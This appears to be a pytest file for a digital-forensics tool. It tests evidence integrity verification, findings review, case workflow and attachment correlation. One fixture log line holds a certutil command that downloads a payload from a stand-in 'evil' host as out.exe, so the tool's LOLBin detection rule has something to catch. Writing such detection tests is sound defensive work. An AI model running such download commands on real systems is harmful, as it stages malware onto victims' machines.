"""
Phase 3 P1 tests:
- Evidence Verification Center (INTEGRITY VERIFIED, SIGNATURE INVALID, EVIDENCE MODIFIED, EVIDENCE MISSING, VERIFICATION INCONCLUSIVE)
- Findings Investigation Center (filters, disposition review, false-positive flag, review history)
- Unified Multi-Source Timeline Explorer
- Analyst Case Workflow (OPEN -> IN_PROGRESS -> UNDER_REVIEW -> CLOSED, notes, tags, activities)
- Bidirectional email attachment correlation
"""

import io
import uuid
from pathlib import Path
import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from starlette.datastructures import Headers, UploadFile
from starlette.requests import Request

from forensight.api.routes import (
    CaseWorkflowPatch,
    EvidenceTagsBody,
    FindingReviewBody,
    get_unified_timeline,
    new_case,
    patch_case_workflow,
    query_findings,
    review_finding,
    set_evidence_tags,
    upload_evidence,
    verify_integrity,
)
from forensight.core.security import make_read_only, make_writable
from forensight.core.types import (
    AnalysisResult,
    EvidenceMetadata,
    EvidenceRecord,
    HashResult,
    RiskScore,
)
from forensight.crypto.keys import key_manager
from forensight.dashboard.routes import (
    case_detail_page,
    findings_center_page,
    global_timeline_page,
    verification_center_page,
)
from forensight.database.models import Base, CaseActivityModel, EvidenceModel, FindingModel
from forensight.evidence.correlation import evidence_correlator
from forensight.storage.manager import evidence_vault


@pytest.fixture
def file_db_session(tmp_path: Path):
    """Isolated SQLite database factory simulating real persistence across restarts."""
    db_path = tmp_path / "phase3.db"
    engine = create_engine(f"sqlite:///{db_path}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    return SessionLocal


def _dummy_request(path: str = "/") -> Request:
    return Request({"type": "http", "method": "GET", "path": path, "headers": [], "query_string": b""})


class TestPhase3Intelligence:
    """Comprehensive tests for Phase 3 Verification, Findings, Timeline, Case Workflow, and Correlation."""

    def test_verification_center_all_statuses_and_persistence(self, file_db_session) -> None:
        key_manager.load_or_create_keypair()
        unique = uuid.uuid4().hex.encode()
        payload = b"2026-11-12 [INFO] Verification test artifact " + unique + b"\n"
        upload = UploadFile(file=io.BytesIO(payload), filename="verify_me.log", headers=Headers({"content-type": "text/plain"}))

        with file_db_session() as db:
            up = upload_evidence(file=upload, case_id=None, db=db)
            ev_id = up["evidence_id"]

        try:
            # 1. Fresh session (simulating restart): must return INTEGRITY VERIFIED
            with file_db_session() as db2:
                v1 = verify_integrity(ev_id, db=db2)
                assert v1["verification_status"] == "INTEGRITY VERIFIED"
                assert v1["manifest_signature_valid"] is True
                assert v1["custody_chain_valid"] is True
                ev_row = db2.query(EvidenceModel).filter(EvidenceModel.evidence_id == ev_id).first()
                assert ev_row.last_verification_status == "INTEGRITY VERIFIED"

                # Verification Center UI page renders cleanly
                page = verification_center_page(_dummy_request("/verification"), db=db2)
                assert page.status_code == 200
                assert "INTEGRITY VERIFIED" in page.body.decode("utf-8")

            # 2. Tamper manifest signature -> SIGNATURE INVALID
            with file_db_session() as db3:
                ev_row = db3.query(EvidenceModel).filter(EvidenceModel.evidence_id == ev_id).first()
                orig_sig = ev_row.manifest_signature
                ev_row.manifest_signature = "0" * 128
                db3.commit()
                v2 = verify_integrity(ev_id, db=db3)
                assert v2["verification_status"] == "SIGNATURE INVALID"
                ev_row.manifest_signature = orig_sig
                db3.commit()

            # 3. Unsigned manifest -> VERIFICATION INCONCLUSIVE
            with file_db_session() as db4:
                ev_row = db4.query(EvidenceModel).filter(EvidenceModel.evidence_id == ev_id).first()
                orig_sig = ev_row.manifest_signature
                ev_row.manifest_signature = None
                db4.commit()
                v3 = verify_integrity(ev_id, db=db4)
                assert v3["verification_status"] == "VERIFICATION INCONCLUSIVE"
                ev_row.manifest_signature = orig_sig
                db4.commit()

            # 4. Tamper stored vault file -> EVIDENCE MODIFIED
            vault_file = evidence_vault.vault_dir / f"{ev_id}.bin"
            make_writable(vault_file)
            vault_file.write_bytes(b"TAMPERED_CONTENT")
            make_read_only(vault_file)
            with file_db_session() as db5:
                v4 = verify_integrity(ev_id, db=db5)
                assert v4["verification_status"] == "EVIDENCE MODIFIED"
                assert v4["is_valid"] is False

            # 5. Missing vault file -> EVIDENCE MISSING
            evidence_vault.delete_evidence(ev_id)
            with file_db_session() as db6:
                v5 = verify_integrity(ev_id, db=db6)
                assert v5["verification_status"] == "EVIDENCE MISSING"
                assert v5["file_exists"] is False
        finally:
            evidence_vault.delete_evidence(ev_id)

    def test_case_workflow_findings_review_and_unified_timeline(self, file_db_session) -> None:
        key_manager.load_or_create_keypair()
        payload = (
            b"2026-11-12 [CMD] certutil -urlcache -f http://evil-"
            + uuid.uuid4().hex.encode()
            + b".example.org/stage.bin out.exe\n"
        )
        upload = UploadFile(file=io.BytesIO(payload), filename="lolbin.log", headers=Headers({"content-type": "text/plain"}))

        ev_id = None
        try:
            with file_db_session() as db:
                case = new_case(
                    title="IR-Phase3 Case Workflow",
                    description="Initial triage scope",
                    investigator="Analyst One",
                    db=db,
                )
                assert case.status == "OPEN"

                up = upload_evidence(file=upload, case_id=case.case_id, db=db)
                ev_id = up["evidence_id"]

                # Tag evidence
                tag_res = set_evidence_tags(ev_id, EvidenceTagsBody(tags=["lolbin", "ingress"]), db=db)
                assert "lolbin" in tag_res["tags"]

                # Case workflow transitions & notes
                patched = patch_case_workflow(
                    case.case_id,
                    CaseWorkflowPatch(
                        status="UNDER_REVIEW",
                        investigator_notes="Confirmed certutil download artifact.",
                        case_summary="Likely staged dropper ingress attempt.",
                        tags=["certutil", "t1105"],
                        actor="Senior Reviewer",
                    ),
                    db=db,
                )
                assert patched["status"] == "UNDER_REVIEW"

                closed = patch_case_workflow(
                    case.case_id,
                    CaseWorkflowPatch(
                        status="CLOSED",
                        closure_notes="Contained host and blocked staging domain.",
                        actor="Senior Reviewer",
                    ),
                    db=db,
                )
                assert closed["status"] == "CLOSED"
                assert closed["closed_by"] == "Senior Reviewer"
                assert closed["closed_at"] is not None

                # Query findings & submit analyst review disposition
                findings = query_findings(severity="HIGH", rule_id="TXT-LOLBIN", case_id=case.case_id, db=db)
                assert len(findings) == 1
                f_id = findings[0]["finding_id"]

                rev = review_finding(
                    f_id,
                    FindingReviewBody(
                        review_status="FALSE_POSITIVE",
                        is_false_positive=False,  # Server forces True when status is FALSE_POSITIVE
                        analyst_notes="Authorized IT patching test",
                        reviewed_by="Analyst Two",
                    ),
                    db=db,
                )
                assert rev["review_status"] == "FALSE_POSITIVE"
                assert rev["is_false_positive"] is True

                # Verify persisted history & CaseActivity log
                f_row = db.query(FindingModel).filter(FindingModel.finding_id == f_id).first()
                assert "Authorized IT patching test" in (f_row.review_history_json or "")
                acts = db.query(CaseActivityModel).filter(CaseActivityModel.case_id == case.case_id).all()
                assert len(acts) >= 4

                # Unified timeline combines vault, custody, and workflow events
                tl = get_unified_timeline(case_id=case.case_id, db=db)
                categories = {e["category"] for e in tl["events"]}
                assert "INGESTION" in categories
                assert "ANALYSIS" in categories
                assert any(c.startswith("CUSTODY:") for c in categories)
                assert any(c.startswith("CASE:") for c in categories)

                # Dashboard HTML pages render cleanly
                assert findings_center_page(_dummy_request("/findings"), db=db).status_code == 200
                assert global_timeline_page(_dummy_request("/timeline"), case_id=case.case_id, db=db).status_code == 200
                case_resp = case_detail_page(case.case_id, _dummy_request(f"/cases/{case.case_id}"), db=db)
                assert case_resp.status_code == 200
                assert "Contained host and blocked staging domain." in case_resp.body.decode("utf-8")
        finally:
            if ev_id:
                evidence_vault.delete_evidence(ev_id)

    def test_bidirectional_email_attachment_correlation(self) -> None:
        att_sha = "e" * 64
        res_attachment = AnalysisResult(
            evidence=EvidenceRecord(
                evidence_id="ev-att",
                case_id="case-corr",
                original_filename="payload.exe",
                sanitized_filename="payload.exe",
                storage_path="/vault/ev-att.bin",
                hashes=HashResult(sha256=att_sha, sha1="a" * 40, md5="b" * 32, size_bytes=100),
            ),
            metadata=EvidenceMetadata(file_size_bytes=100, identified_type="PE", mime_type="application/octet-stream", declared_extension=".exe", entropy=5.0),
            risk=RiskScore(score=60, verdict="SUSPICIOUS", summary="PE"),
        )
        res_email = AnalysisResult(
            evidence=EvidenceRecord(
                evidence_id="ev-eml",
                case_id="case-corr",
                original_filename="phish.eml",
                sanitized_filename="phish.eml",
                storage_path="/vault/ev-eml.bin",
                hashes=HashResult(sha256="f" * 64, sha1="c" * 40, md5="d" * 32, size_bytes=200),
            ),
            metadata=EvidenceMetadata(file_size_bytes=200, identified_type="EML", mime_type="message/rfc822", declared_extension=".eml", entropy=4.0),
            risk=RiskScore(score=50, verdict="SUSPICIOUS", summary="EML"),
            analyzer_details={"attachments": [{"filename": "payload.exe", "sha256": att_sha}]},
        )

        # Attachment comes BEFORE email in list -> reverse branch must still link them
        rels = evidence_correlator.correlate_case_evidence([res_attachment, res_email])
        assert any(r.relationship_type.value == "EMAIL_ATTACHMENT" and r.shared_value == att_sha for r in rels)

